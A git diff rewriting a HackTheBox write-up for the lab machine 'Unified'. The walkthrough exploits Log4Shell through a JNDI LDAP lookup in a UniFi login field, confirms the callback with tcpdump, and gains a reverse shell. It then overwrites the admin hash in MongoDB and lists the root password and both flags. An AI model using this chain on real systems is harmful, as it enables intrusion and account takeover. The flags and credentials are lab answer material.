@@ -2,6 +2,7 @@
 title: Unified
 author: Julien Bongars
 date: 2025-05
+link: "[app.hackthebox.com/machines/Unified](https://app.hackthebox.com/machines/Unified)"
 tags:
   - HackTheBox
   - Very Easy
@@ -9,23 +10,42 @@ tags:
   - Hacking
 ---
 
-ip = 10.129.71.133
+# Unified — Writeup
 
-found port 8443 on my own
+> Platform: HackTheBox · Difficulty: **Very Easy** · OS: **Linux**
+> Target: `10.129.71.133`
+> Ref: [app.hackthebox.com/machines/Unified](https://app.hackthebox.com/machines/Unified)
 
-## Ports
+## Summary
 
+Unified is a Very Easy Linux box running a UniFi Network Controller. Several ports are open; the useful surface is the HTTPS dashboard on **8443** (with **8080** proxying into it). The login API logs the JSON `remember` field through Log4j, so a `${jndi:ldap://…}` payload in that field triggers **CVE-2021-44228 (Log4Shell)**. Confirming the outbound LDAP connect with `tcpdump`, then serving a malicious LDAP/JNDI payload, yields a reverse shell on the box.
+
+From the shell, the local MongoDB on port **27117** (database `ace`) holds the UniFi admin document and its `x_shadow` hash. Replacing that hash with a known SHA-512 crypt value unlocks the UniFi UI as admin. From there the root SSH password is recovered as `NotACrackablePassword4U2022`, giving both flags.
+
+---
+
+## Recon
+
+### Port scanning
+
+<!-- TODO: full nmap/rustscan output was not captured in the draft — only the author's port notes. -->
+
+```txt
 22 - ssh
 6789 - ibm-db2-admin?
 8080 - http-proxy - status 404 - should ffuf?
 8443 - web dashboard trying to crack. cannot ffuf as will redirect to login
 8843 - ssl? - status 400 - may be used for api?
 8880 - tcp? - status 404 - should ffuf
+```
 
-## 8080
+Port **8443** was found manually. **8080** is a proxy in front of 8443.
 
-Proxy for 8443. Found the following paths:-
+### Enumeration
 
+ffuf against 8080 turns up paths that mostly redirect into the 8443 dashboard:
+
+```txt
 /print (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/print]
 /pages (Status: 302) [Size: 0] [--> /pages/]
 /upload (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/upload]
@@ -38,14 +58,15 @@ Proxy for 8443. Found the following paths:-
 /manage (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/manage]
 /op (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/op]
 /verify (Status: 302) [Size: 0] [--> /manage/account/verify?r=1]
+```
 
-## CVE-2021-44228: Log4j
+The login UI on 8443 is the attack surface. Background on the Log4j issue: https://censys.com/blog/cve-2021-44228-log4j
 
-link - https://censys.com/blog/cve-2021-44228-log4j
+---
 
-### Flow
+## Stage 1: Log4Shell on UniFi `/api/login` → shell
 
-we can modify the form data to inject a payload in the "remember password" field. This payload will be injected in the logger like so
+The UniFi login handler logs username and the `remember` field. Injecting a JNDI lookup into `remember` makes Log4j resolve it at log time:
 
 ```java
 log.info("username: ${username} ; remember: ${remember});
@@ -54,17 +75,13 @@ log.info("username: ${username} ; remember: ${remember});
 log.info("username: ${payload.username} ; remember: ${<payload>});
 ```
 
-We can use JNDI to dynamicall fetch a file using LDAP (we create a malicious LDAP server) to get a reverse shell up in the server.
-
-Use burpsuite to capture the POST request from the unifi network server and forward request to repeater.
-
-create tcp dump logger:
+Capture the login POST in Burp and send it to Repeater. Listen for the LDAP callback:
 
 ```bash
 └──╼ [★]$ sudo tcpdump -i tun0 port 1389
 ```
 
-#### Original Payload
+#### Original payload
 
 ```http
 POST /api/login HTTP/1.1
@@ -89,7 +106,7 @@ Connection: keep-alive
 {"username":"testuser","password":"testpassword","remember": true,"strict":true}
 ```
 
-#### Modified Payload
+#### Modified payload
 
 ```http
 POST /api/login HTTP/1.1
@@ -126,11 +143,17 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 18:33:36.891622 IP htb-ie8f9usvwk.1389 > 10.129.53.120.55414: Flags [R.], seq 0, ack 1293191774, win 0, length 0
 ```
 
-User the following notes to launch LDAP attack: notes/infiltration/general/ldap-for-jndi-attack.md
+The target reaches out to port 1389 — Log4Shell is live. Stand up the malicious LDAP/JNDI server (author notes: `notes/infiltration/general/ldap-for-jndi-attack.md`) and complete the callback to get a reverse shell.
 
-once we get a shell we try to find the mongodb by either finding the socket or use tcp to call the instance.
+<!-- TODO: draft does not capture the LDAP server / payload-generation commands or the resulting shell transcript. -->
 
-keep in mind the port is 27117 and db is ace
+Stage result: reverse shell on the UniFi host.
+
+---
+
+## Stage 2: MongoDB `ace` → reset UniFi admin → root
+
+Look for MongoDB via its socket or TCP. Port is **27117**, database **`ace`**:
 
 ```bash
 mongo --port 27117 ace
@@ -139,7 +162,7 @@ mongo --port 27117 ace
 # db.admin.find().forEach(printjson)
 ```
 
-We find the hash for admin account
+Admin document includes the password hash:
 
 ```bash
 # "x_shadow": "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
@@ -153,7 +176,7 @@ openssl passwd -6 -salt $(openssl rand -base64 16) password123
 mkpasswd -m sha-512 Password1234
 ```
 
-update the admin password:
+Overwrite `x_shadow` with the known hash for `password123`:
 
 ```js
 db.admin.updateOne(
@@ -167,7 +190,50 @@ db.admin.updateOne(
 );
 ```
 
-log into unified box, password to root account is: NotACrackablePassword4U2022
+Log into the UniFi UI with the new admin password. The root account password recovered from the box is:
 
+```txt
+NotACrackablePassword4U2022
+```
+
+<!-- TODO: draft does not show where NotACrackablePassword4U2022 was read from (e.g. UniFi settings / a file) — only the final value. -->
+
+Flags:
+
+```txt
 user: 6ced1a6a89e666c0620cdb10262ba127
 root: e50bc93c75b634e4b272d2f771c33681
+```
+
+Stage result: UniFi admin access, root SSH with `NotACrackablePassword4U2022`, both flags.
+
+---
+
+## Credentials
+
+| Source | Credential | Notes |
+| --- | --- | --- |
+| MongoDB `ace.admin` (original) | `x_shadow` `$6$Ry6Vdbse$8enMR5Znxoo…QgPTt4.` | SHA-512 crypt; not cracked |
+| MongoDB overwrite | UniFi admin → `password123` | Hash generated with `openssl passwd -6` |
+| Post-admin access | root / `NotACrackablePassword4U2022` | Used for root / SSH |
+
+---
+
+## Key lessons
+
+- **Log4Shell can sit in non-username fields.** Here the JNDI string went in `remember`, which the server still logged — any logged attacker-controlled field is a candidate.
+- **Confirm the callback before building the full chain.** `tcpdump -i tun0 port 1389` proved the LDAP connect before standing up the rogue LDAP server.
+- **App config DBs beat cracking.** The UniFi admin hash was replaceable in MongoDB; generating a known `$6$` hash and `updateOne` was faster than attacking the original crypt.
+
+---
+
+## Tools & cheat sheet
+
+| Tool | Purpose in this box | Key command |
+| --- | --- | --- |
+| ffuf | Path discovery on 8080 | paths under `/api`, `/manage`, `/setup`, … |
+| Burp Suite | Capture / replay UniFi `/api/login` | POST JSON with `remember` JNDI payload |
+| `tcpdump` | Confirm Log4Shell LDAP callback | `sudo tcpdump -i tun0 port 1389` |
+| Rogue LDAP / JNDI | Deliver Log4Shell payload → shell | see `notes/infiltration/general/ldap-for-jndi-attack.md` |
+| `mongo` | Read/update UniFi `ace` admin hash | `mongo --port 27117 ace` |
+| `openssl passwd -6` | Generate replacement `x_shadow` | `openssl passwd -6 -salt $(openssl rand -base64 16) password123` |
